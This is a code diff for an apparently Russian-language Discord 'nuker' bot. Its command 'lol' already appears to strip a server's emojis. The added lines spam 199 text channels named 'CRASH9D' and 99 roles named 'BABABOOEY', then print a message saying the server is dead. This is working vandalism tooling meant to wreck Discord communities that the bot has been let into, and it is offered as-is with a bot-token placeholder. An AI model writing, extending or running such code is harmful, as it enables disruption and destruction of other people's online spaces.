@@ -74,7 +74,20 @@ async def lol(ctx):
             print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Ошибка")
     print(f"{Fore.WHITE}> {Fore.RED}Все, смайлов больше нет...{Fore.WHITE}.")
     
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам")
+    for b in range(199):
+        await ctx.guild.create_text_channel("CRASH9D")
+        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал канал")
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наспамил...")
+
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Начинаем спам ролями")
+    for a in range(99):
+        await ctx.guild.create_role(name="BABABOOEY")
+        print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Создал роль")
+    print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Наcпамил...")
+    
     print(f"{Fore.WHITE}> {Fore.RED}Сервер УМЕР{Fore.WHITE}.")
+    
 
 try:
     client.run('токен сюда')
